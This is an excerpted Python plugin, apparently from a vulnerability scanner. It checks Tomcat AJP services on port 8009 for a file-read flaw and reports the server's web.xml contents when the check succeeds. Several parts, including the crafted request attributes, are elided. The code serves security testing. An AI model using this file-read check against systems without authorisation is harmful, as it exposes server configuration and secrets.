...
class Tomcat(object):
    ...
    def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
        ...
        if len(data_res) == 0:
            logger.error("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
        return snd_hdrs_res, data_res


class TomcatAjpBaseVerify:
    ...
    def run(self):
        try:
            t = Tomcat(self.ip, self.port)
            return t.perform_request(f'/asdf', attributes=[
...
async def do_scan(ip, port, service, is_http, task_msg):
    if service.lower().find('ajp') < 0 and port != 8009:
        return

    t = TomcatAjpBaseVerify(ip, port)
    r = await t.run()
    if r and r[1][0].data.decode().strip().find('<web-app ') >= 0:
        ret = {
            'alert_group': 'Tomcat AJP Read File',
            'affects': '%s://%s:%s' % (service, ip, port),
            'details': 'Tomcat AJP Can Read WEP APP dir file. Here is the content of web.xml:\n'
                       '\n\n' + r[1][0].data.decode().strip()
        }
        return ret


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8009, 'ajp13', True, task_msg={})
